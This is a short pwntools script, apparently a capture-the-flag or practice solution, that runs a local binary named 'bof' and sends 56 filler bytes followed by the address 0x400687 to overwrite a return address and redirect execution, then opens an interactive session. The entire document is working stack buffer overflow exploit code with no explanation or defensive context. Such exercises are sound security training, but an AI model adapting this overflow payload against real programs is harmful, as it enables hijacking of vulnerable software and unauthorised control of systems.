from pwn import *

r = process('./bof')
#r = remote('localhost',10170)
payload = b'A'*56
r.sendline(payload + p64(0x400687))

r.interactive()
